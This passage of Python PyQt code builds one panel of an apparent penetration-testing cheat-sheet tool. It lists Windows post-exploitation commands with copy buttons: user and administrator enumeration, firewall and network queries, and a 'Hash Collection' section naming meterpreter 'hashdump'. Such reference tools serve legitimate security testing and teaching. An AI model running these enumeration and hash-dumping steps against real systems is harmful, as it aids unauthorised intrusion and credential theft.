        if hasattr(self, 'wpe_5_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_5_divider1)
            self.wpe_5_divider1.deleteLater()
        self.wpe_5_divider1 = QFrame()
        self.wpe_5_divider1.setFrameShape(QFrame.HLine)
        self.wpe_5_divider1.setLineWidth(3)
        self.wpe_5_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_5_divider2
        if hasattr(self, 'wpe_5_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_5_divider2)
            self.wpe_5_divider2.deleteLater()
        self.wpe_5_divider2 = QFrame()
        self.wpe_5_divider2.setFrameShape(QFrame.HLine)
        self.wpe_5_divider2.setLineWidth(3)
        self.wpe_5_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_5_spacer1
        if hasattr(self, 'wpe_5_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_5_spacer1)
            self.wpe_5_spacer1.deleteLater()
        self.wpe_5_spacer1 = QLabel()
        self.wpe_5_spacer1.setFixedWidth(40)
        self.wpe_5_spacer1.setFixedHeight(50)
     
        # wpe_5_spacer2
        if hasattr(self, 'wpe_5_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_5_spacer2)
            self.wpe_5_spacer2.deleteLater()
        self.wpe_5_spacer2 = QLabel()
        self.wpe_5_spacer2.setFixedWidth(40)
        self.wpe_5_spacer2.setFixedHeight(50)
     
        # wpe_5 spacer & divider layout
        self.tab4_container_layout.insertWidget(76, self.wpe_5_spacer1)
        self.tab4_container_layout.insertWidget(77, self.wpe_5_divider1)
        self.tab4_container_layout.insertWidget(78, self.wpe_5_divider2)
        self.tab4_container_layout.insertWidget(79, self.wpe_5_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_6
        if hasattr(self, 'wpe_6'):
            self.tab4_container_layout.removeWidget(self.wpe_6)
            self.wpe_6.deleteLater()
        self.wpe_6 = QLabel("[ + Current user's privileges ]")
        self.wpe_6.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(80,self.wpe_6)
     
        # wpe_6_Scan1
        if hasattr(self, 'wpe_6_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_6_Scan1)
            self.wpe_6_Scan1.deleteLater()
        self.wpe_6_Scan1 = QLabel("net user <User_Name>")
        self.wpe_6_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(81,self.wpe_6_Scan1)
     
        # wpe_6_Scan1_Copy
        if hasattr(self, 'wpe_6_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_6_Scan1_Copy)
            self.wpe_6_Scan1_Copy.deleteLater()
        self.wpe_6_Scan1_Copy = QPushButton()
        self.wpe_6_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_6_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_6_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_6_Scan1.text()))
        self.wpe_6_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_6_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_6_Scan1_Copy)
        label_layout.addWidget(self.wpe_6_Scan1)
        self.tab4_container_layout.insertLayout(82, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_6_divider1
        if hasattr(self, 'wpe_6_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_6_divider1)
            self.wpe_6_divider1.deleteLater()
        self.wpe_6_divider1 = QFrame()
        self.wpe_6_divider1.setFrameShape(QFrame.HLine)
        self.wpe_6_divider1.setLineWidth(3)
        self.wpe_6_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_6_divider2
        if hasattr(self, 'wpe_6_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_6_divider2)
            self.wpe_6_divider2.deleteLater()
        self.wpe_6_divider2 = QFrame()
        self.wpe_6_divider2.setFrameShape(QFrame.HLine)
        self.wpe_6_divider2.setLineWidth(3)
        self.wpe_6_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_6_spacer1
        if hasattr(self, 'wpe_6_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_6_spacer1)
            self.wpe_6_spacer1.deleteLater()
        self.wpe_6_spacer1 = QLabel()
        self.wpe_6_spacer1.setFixedWidth(40)
        self.wpe_6_spacer1.setFixedHeight(50)
     
        # wpe_6_spacer2
        if hasattr(self, 'wpe_6_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_6_spacer2)
            self.wpe_6_spacer2.deleteLater()
        self.wpe_6_spacer2 = QLabel()
        self.wpe_6_spacer2.setFixedWidth(40)
        self.wpe_6_spacer2.setFixedHeight(50)
     
        # wpe_6 spacer & divider layout
        self.tab4_container_layout.insertWidget(83, self.wpe_6_spacer1)
        self.tab4_container_layout.insertWidget(84, self.wpe_6_divider1)
        self.tab4_container_layout.insertWidget(85, self.wpe_6_divider2)
        self.tab4_container_layout.insertWidget(86, self.wpe_6_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_7
        if hasattr(self, 'wpe_7'):
            self.tab4_container_layout.removeWidget(self.wpe_7)
            self.wpe_7.deleteLater()
        self.wpe_7 = QLabel("[ + Other user's privileges ]")
        self.wpe_7.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(87,self.wpe_7)
     
        # wpe_7_Scan1
        if hasattr(self, 'wpe_7_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_7_Scan1)
            self.wpe_7_Scan1.deleteLater()
        self.wpe_7_Scan1 = QLabel("net users")
        self.wpe_7_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(88,self.wpe_7_Scan1)
     
        # wpe_7_Scan1_Copy
        if hasattr(self, 'wpe_7_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_7_Scan1_Copy)
            self.wpe_7_Scan1_Copy.deleteLater()
        self.wpe_7_Scan1_Copy = QPushButton()
        self.wpe_7_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_7_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_7_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_7_Scan1.text()))
        self.wpe_7_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_7_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_7_Scan1_Copy)
        label_layout.addWidget(self.wpe_7_Scan1)
        self.tab4_container_layout.insertLayout(89, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_7_divider1
        if hasattr(self, 'wpe_7_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_7_divider1)
            self.wpe_7_divider1.deleteLater()
        self.wpe_7_divider1 = QFrame()
        self.wpe_7_divider1.setFrameShape(QFrame.HLine)
        self.wpe_7_divider1.setLineWidth(3)
        self.wpe_7_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_7_divider2
        if hasattr(self, 'wpe_7_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_7_divider2)
            self.wpe_7_divider2.deleteLater()
        self.wpe_7_divider2 = QFrame()
        self.wpe_7_divider2.setFrameShape(QFrame.HLine)
        self.wpe_7_divider2.setLineWidth(3)
        self.wpe_7_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_7_spacer1
        if hasattr(self, 'wpe_7_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_7_spacer1)
            self.wpe_7_spacer1.deleteLater()
        self.wpe_7_spacer1 = QLabel()
        self.wpe_7_spacer1.setFixedWidth(40)
        self.wpe_7_spacer1.setFixedHeight(50)
     
        # wpe_7_spacer2
        if hasattr(self, 'wpe_7_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_7_spacer2)
            self.wpe_7_spacer2.deleteLater()
        self.wpe_7_spacer2 = QLabel()
        self.wpe_7_spacer2.setFixedWidth(40)
        self.wpe_7_spacer2.setFixedHeight(50)
     
        # wpe_7 spacer & divider layout
        self.tab4_container_layout.insertWidget(90, self.wpe_7_spacer1)
        self.tab4_container_layout.insertWidget(91, self.wpe_7_divider1)
        self.tab4_container_layout.insertWidget(92, self.wpe_7_divider2)
        self.tab4_container_layout.insertWidget(93, self.wpe_7_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_8
        if hasattr(self, 'wpe_8'):
            self.tab4_container_layout.removeWidget(self.wpe_8)
            self.wpe_8.deleteLater()
        self.wpe_8 = QLabel("[ + Hash Collection ]")
        self.wpe_8.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(94,self.wpe_8)
     
        # wpe_8_Scan1
        if hasattr(self, 'wpe_8_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_8_Scan1)
            self.wpe_8_Scan1.deleteLater()
        self.wpe_8_Scan1 = QLabel("pg_dump.exe")
        self.wpe_8_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(95,self.wpe_8_Scan1)
     
        # wpe_8_Scan1_Copy
        if hasattr(self, 'wpe_8_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_8_Scan1_Copy)
            self.wpe_8_Scan1_Copy.deleteLater()
        self.wpe_8_Scan1_Copy = QPushButton()
        self.wpe_8_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_8_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_8_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_8_Scan1.text()))
        self.wpe_8_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_8_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_8_Scan1_Copy)
        label_layout.addWidget(self.wpe_8_Scan1)
        self.tab4_container_layout.insertLayout(96, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_8_divider1
        if hasattr(self, 'wpe_8_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_8_divider1)
            self.wpe_8_divider1.deleteLater()
        self.wpe_8_divider1 = QFrame()
        self.wpe_8_divider1.setFrameShape(QFrame.HLine)
        self.wpe_8_divider1.setLineWidth(3)
        self.wpe_8_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_8_divider2
        if hasattr(self, 'wpe_8_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_8_divider2)
            self.wpe_8_divider2.deleteLater()
        self.wpe_8_divider2 = QFrame()
        self.wpe_8_divider2.setFrameShape(QFrame.HLine)
        self.wpe_8_divider2.setLineWidth(3)
        self.wpe_8_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_8_spacer1
        if hasattr(self, 'wpe_8_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_8_spacer1)
            self.wpe_8_spacer1.deleteLater()
        self.wpe_8_spacer1 = QLabel()
        self.wpe_8_spacer1.setFixedWidth(40)
        self.wpe_8_spacer1.setFixedHeight(50)
     
        # wpe_8_spacer2
        if hasattr(self, 'wpe_8_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_8_spacer2)
            self.wpe_8_spacer2.deleteLater()
        self.wpe_8_spacer2 = QLabel()
        self.wpe_8_spacer2.setFixedWidth(40)
        self.wpe_8_spacer2.setFixedHeight(50)
     
        # wpe_8 spacer & divider layout
        self.tab4_container_layout.insertWidget(97, self.wpe_8_spacer1)
        self.tab4_container_layout.insertWidget(98, self.wpe_8_divider1)
        self.tab4_container_layout.insertWidget(99, self.wpe_8_divider2)
        self.tab4_container_layout.insertWidget(100, self.wpe_8_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_8_Scan2
        if hasattr(self, 'wpe_8_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_8_Scan2)
            self.wpe_8_Scan2.deleteLater()
        self.wpe_8_Scan2 = QLabel("[ - meterpreter ]")
        self.wpe_8_Scan2.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(101,self.wpe_8_Scan2)
     
        # wpe_8_Scan3
        if hasattr(self, 'wpe_8_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_8_Scan3)
            self.wpe_8_Scan3.deleteLater()
        self.wpe_8_Scan3 = QLabel("hashdump")
        self.wpe_8_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(102,self.wpe_8_Scan3)
     
        # wpe_8_Scan3_Copy
        if hasattr(self, 'wpe_8_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_8_Scan3_Copy)
            self.wpe_8_Scan3_Copy.deleteLater()
        self.wpe_8_Scan3_Copy = QPushButton()
        self.wpe_8_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_8_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_8_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_8_Scan3.text()))
        self.wpe_8_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_8_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_8_Scan3_Copy)
        label_layout.addWidget(self.wpe_8_Scan3)
        self.tab4_container_layout.insertLayout(103, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_8_divider1
        if hasattr(self, 'wpe_8_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_8_divider1)
            self.wpe_8_divider1.deleteLater()
        self.wpe_8_divider1 = QFrame()
        self.wpe_8_divider1.setFrameShape(QFrame.HLine)
        self.wpe_8_divider1.setLineWidth(3)
        self.wpe_8_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_8_divider2
        if hasattr(self, 'wpe_8_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_8_divider2)
            self.wpe_8_divider2.deleteLater()
        self.wpe_8_divider2 = QFrame()
        self.wpe_8_divider2.setFrameShape(QFrame.HLine)
        self.wpe_8_divider2.setLineWidth(3)
        self.wpe_8_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_8_spacer1
        if hasattr(self, 'wpe_8_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_8_spacer1)
            self.wpe_8_spacer1.deleteLater()
        self.wpe_8_spacer1 = QLabel()
        self.wpe_8_spacer1.setFixedWidth(40)
        self.wpe_8_spacer1.setFixedHeight(50)
     
        # wpe_8_spacer2
        if hasattr(self, 'wpe_8_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_8_spacer2)
            self.wpe_8_spacer2.deleteLater()
        self.wpe_8_spacer2 = QLabel()
        self.wpe_8_spacer2.setFixedWidth(40)
        self.wpe_8_spacer2.setFixedHeight(50)
     
        # wpe_8 spacer & divider layout
        self.tab4_container_layout.insertWidget(104, self.wpe_8_spacer1)
        self.tab4_container_layout.insertWidget(105, self.wpe_8_divider1)
        self.tab4_container_layout.insertWidget(106, self.wpe_8_divider2)
        self.tab4_container_layout.insertWidget(107, self.wpe_8_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_9
        if hasattr(self, 'wpe_9'):
            self.tab4_container_layout.removeWidget(self.wpe_9)
            self.wpe_9.deleteLater()
        self.wpe_9 = QLabel("[ + Administrator ]")
        self.wpe_9.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(108,self.wpe_9)
     
        # wpe_9_Scan1
        if hasattr(self, 'wpe_9_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_9_Scan1)
            self.wpe_9_Scan1.deleteLater()
        self.wpe_9_Scan1 = QLabel("net localgroup administrators")
        self.wpe_9_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(109,self.wpe_9_Scan1)
     
        # wpe_9_Scan1_Copy
        if hasattr(self, 'wpe_9_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_9_Scan1_Copy)
            self.wpe_9_Scan1_Copy.deleteLater()
        self.wpe_9_Scan1_Copy = QPushButton()
        self.wpe_9_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_9_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_9_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_9_Scan1.text()))
        self.wpe_9_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_9_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_9_Scan1_Copy)
        label_layout.addWidget(self.wpe_9_Scan1)
        self.tab4_container_layout.insertLayout(110, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_9_divider1
        if hasattr(self, 'wpe_9_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_9_divider1)
            self.wpe_9_divider1.deleteLater()
        self.wpe_9_divider1 = QFrame()
        self.wpe_9_divider1.setFrameShape(QFrame.HLine)
        self.wpe_9_divider1.setLineWidth(3)
        self.wpe_9_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_9_divider2
        if hasattr(self, 'wpe_9_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_9_divider2)
            self.wpe_9_divider2.deleteLater()
        self.wpe_9_divider2 = QFrame()
        self.wpe_9_divider2.setFrameShape(QFrame.HLine)
        self.wpe_9_divider2.setLineWidth(3)
        self.wpe_9_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_9_spacer1
        if hasattr(self, 'wpe_9_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_9_spacer1)
            self.wpe_9_spacer1.deleteLater()
        self.wpe_9_spacer1 = QLabel()
        self.wpe_9_spacer1.setFixedWidth(40)
        self.wpe_9_spacer1.setFixedHeight(50)
     
        # wpe_9_spacer2
        if hasattr(self, 'wpe_9_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_9_spacer2)
            self.wpe_9_spacer2.deleteLater()
        self.wpe_9_spacer2 = QLabel()
        self.wpe_9_spacer2.setFixedWidth(40)
        self.wpe_9_spacer2.setFixedHeight(50)
     
        # wpe_9 spacer & divider layout
        self.tab4_container_layout.insertWidget(111, self.wpe_9_spacer1)
        self.tab4_container_layout.insertWidget(112, self.wpe_9_divider1)
        self.tab4_container_layout.insertWidget(113, self.wpe_9_divider2)
        self.tab4_container_layout.insertWidget(114, self.wpe_9_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_10
        if hasattr(self, 'wpe_10'):
            self.tab4_container_layout.removeWidget(self.wpe_10)
            self.wpe_10.deleteLater()
        self.wpe_10 = QLabel("[ + Administrator Latereral Movement ]")
        self.wpe_10.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(115,self.wpe_10)
     
        # wpe_10_Scan1
        if hasattr(self, 'wpe_10_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_10_Scan1)
            self.wpe_10_Scan1.deleteLater()
        self.wpe_10_Scan1 = QLabel("net user somePotentialAdminUser")
        self.wpe_10_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(116,self.wpe_10_Scan1)
     
        # wpe_10_Scan1_Copy
        if hasattr(self, 'wpe_10_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_10_Scan1_Copy)
            self.wpe_10_Scan1_Copy.deleteLater()
        self.wpe_10_Scan1_Copy = QPushButton()
        self.wpe_10_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_10_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_10_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_10_Scan1.text()))
        self.wpe_10_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_10_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_10_Scan1_Copy)
        label_layout.addWidget(self.wpe_10_Scan1)
        self.tab4_container_layout.insertLayout(117, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_10_divider1
        if hasattr(self, 'wpe_10_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_10_divider1)
            self.wpe_10_divider1.deleteLater()
        self.wpe_10_divider1 = QFrame()
        self.wpe_10_divider1.setFrameShape(QFrame.HLine)
        self.wpe_10_divider1.setLineWidth(3)
        self.wpe_10_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_10_divider2
        if hasattr(self, 'wpe_10_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_10_divider2)
            self.wpe_10_divider2.deleteLater()
        self.wpe_10_divider2 = QFrame()
        self.wpe_10_divider2.setFrameShape(QFrame.HLine)
        self.wpe_10_divider2.setLineWidth(3)
        self.wpe_10_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_10_spacer1
        if hasattr(self, 'wpe_10_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_10_spacer1)
            self.wpe_10_spacer1.deleteLater()
        self.wpe_10_spacer1 = QLabel()
        self.wpe_10_spacer1.setFixedWidth(40)
        self.wpe_10_spacer1.setFixedHeight(50)
     
        # wpe_10_spacer2
        if hasattr(self, 'wpe_10_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_10_spacer2)
            self.wpe_10_spacer2.deleteLater()
        self.wpe_10_spacer2 = QLabel()
        self.wpe_10_spacer2.setFixedWidth(40)
        self.wpe_10_spacer2.setFixedHeight(50)
     
        # wpe_10 spacer & divider layout
        self.tab4_container_layout.insertWidget(118, self.wpe_10_spacer1)
        self.tab4_container_layout.insertWidget(119, self.wpe_10_divider1)
        self.tab4_container_layout.insertWidget(120, self.wpe_10_divider2)
        self.tab4_container_layout.insertWidget(121, self.wpe_10_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_11
        if hasattr(self, 'wpe_11'):
            self.tab4_container_layout.removeWidget(self.wpe_11)
            self.wpe_11.deleteLater()
        self.wpe_11 = QLabel("[ + Firewall Information ]")
        self.wpe_11.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(122,self.wpe_11)
     
        # wpe_11_Scan1
        if hasattr(self, 'wpe_11_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_11_Scan1)
            self.wpe_11_Scan1.deleteLater()
        self.wpe_11_Scan1 = QLabel("netsh firewall show state")
        self.wpe_11_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(123,self.wpe_11_Scan1)
     
        # wpe_11_Scan1_Copy
        if hasattr(self, 'wpe_11_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_11_Scan1_Copy)
            self.wpe_11_Scan1_Copy.deleteLater()
        self.wpe_11_Scan1_Copy = QPushButton()
        self.wpe_11_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_11_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_11_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_11_Scan1.text()))
        self.wpe_11_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_11_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_11_Scan1_Copy)
        label_layout.addWidget(self.wpe_11_Scan1)
        self.tab4_container_layout.insertLayout(124, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_11_divider1
        if hasattr(self, 'wpe_11_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_11_divider1)
            self.wpe_11_divider1.deleteLater()
        self.wpe_11_divider1 = QFrame()
        self.wpe_11_divider1.setFrameShape(QFrame.HLine)
        self.wpe_11_divider1.setLineWidth(3)
        self.wpe_11_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_11_divider2
        if hasattr(self, 'wpe_11_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_11_divider2)
            self.wpe_11_divider2.deleteLater()
        self.wpe_11_divider2 = QFrame()
        self.wpe_11_divider2.setFrameShape(QFrame.HLine)
        self.wpe_11_divider2.setLineWidth(3)
        self.wpe_11_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_11_spacer1
        if hasattr(self, 'wpe_11_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_11_spacer1)
            self.wpe_11_spacer1.deleteLater()
        self.wpe_11_spacer1 = QLabel()
        self.wpe_11_spacer1.setFixedWidth(40)
        self.wpe_11_spacer1.setFixedHeight(50)
     
        # wpe_11_spacer2
        if hasattr(self, 'wpe_11_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_11_spacer2)
            self.wpe_11_spacer2.deleteLater()
        self.wpe_11_spacer2 = QLabel()
        self.wpe_11_spacer2.setFixedWidth(40)
        self.wpe_11_spacer2.setFixedHeight(50)
     
        # wpe_11 spacer & divider layout
        self.tab4_container_layout.insertWidget(125, self.wpe_11_spacer1)
        self.tab4_container_layout.insertWidget(126, self.wpe_11_divider1)
        self.tab4_container_layout.insertWidget(127, self.wpe_11_divider2)
        self.tab4_container_layout.insertWidget(128, self.wpe_11_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_11_Scan2
        if hasattr(self, 'wpe_11_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_11_Scan2)
            self.wpe_11_Scan2.deleteLater()
        self.wpe_11_Scan2 = QLabel("netsh firewall show config")
        self.wpe_11_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(129,self.wpe_11_Scan2)
     
        # wpe_11_Scan2_Copy
        if hasattr(self, 'wpe_11_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_11_Scan2_Copy)
            self.wpe_11_Scan2_Copy.deleteLater()
        self.wpe_11_Scan2_Copy = QPushButton()
        self.wpe_11_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_11_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_11_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_11_Scan2.text()))
        self.wpe_11_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_11_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_11_Scan2_Copy)
        label_layout.addWidget(self.wpe_11_Scan2)
        self.tab4_container_layout.insertLayout(130, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_11_divider1
        if hasattr(self, 'wpe_11_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_11_divider1)
            self.wpe_11_divider1.deleteLater()
        self.wpe_11_divider1 = QFrame()
        self.wpe_11_divider1.setFrameShape(QFrame.HLine)
        self.wpe_11_divider1.setLineWidth(3)
        self.wpe_11_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_11_divider2
        if hasattr(self, 'wpe_11_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_11_divider2)
            self.wpe_11_divider2.deleteLater()
        self.wpe_11_divider2 = QFrame()
        self.wpe_11_divider2.setFrameShape(QFrame.HLine)
        self.wpe_11_divider2.setLineWidth(3)
        self.wpe_11_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_11_spacer1
        if hasattr(self, 'wpe_11_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_11_spacer1)
            self.wpe_11_spacer1.deleteLater()
        self.wpe_11_spacer1 = QLabel()
        self.wpe_11_spacer1.setFixedWidth(40)
        self.wpe_11_spacer1.setFixedHeight(50)
     
        # wpe_11_spacer2
        if hasattr(self, 'wpe_11_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_11_spacer2)
            self.wpe_11_spacer2.deleteLater()
        self.wpe_11_spacer2 = QLabel()
        self.wpe_11_spacer2.setFixedWidth(40)
        self.wpe_11_spacer2.setFixedHeight(50)
     
        # wpe_11 spacer & divider layout
        self.tab4_container_layout.insertWidget(131, self.wpe_11_spacer1)
        self.tab4_container_layout.insertWidget(132, self.wpe_11_divider1)
        self.tab4_container_layout.insertWidget(133, self.wpe_11_divider2)
        self.tab4_container_layout.insertWidget(134, self.wpe_11_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_12
        if hasattr(self, 'wpe_12'):
            self.tab4_container_layout.removeWidget(self.wpe_12)
            self.wpe_12.deleteLater()
        self.wpe_12 = QLabel("[ + Network Information ]")
        self.wpe_12.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(135,self.wpe_12)
     
        # wpe_12_Scan1
        if hasattr(self, 'wpe_12_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_12_Scan1)
            self.wpe_12_Scan1.deleteLater()
        self.wpe_12_Scan1 = QLabel("netstat -anoy")
        self.wpe_12_Scan1.setStyleSheet(
            "color: 'white';" +
